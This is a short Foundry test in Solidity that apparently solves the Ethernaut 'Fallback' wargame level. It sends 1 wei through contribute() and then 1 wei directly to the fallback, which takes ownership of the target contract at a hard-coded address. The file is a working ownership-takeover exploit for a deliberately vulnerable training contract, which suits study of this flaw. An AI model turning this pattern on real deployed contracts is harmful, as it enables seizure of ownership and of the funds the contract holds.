// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "contracts/1Fallback.sol";

contract FallbackAttackerTest is Test {
    Fallback public targetContract = Fallback(payable(0x462cbc4e87A29724276986561AAe35D193da5156));

    function test() public {
        vm.startBroadcast();
        address startingOwner = targetContract.owner();
        // challenge completetion
        targetContract.contribute{value: 1 wei}();
        (bool success,) = address(targetContract).call{value: 1 wei}("");
        // check success
        assertNotEq(startingOwner, targetContract.owner());
        assertEq(targetContract.owner(), msg.sender);
        vm.stopBroadcast();
    }
}
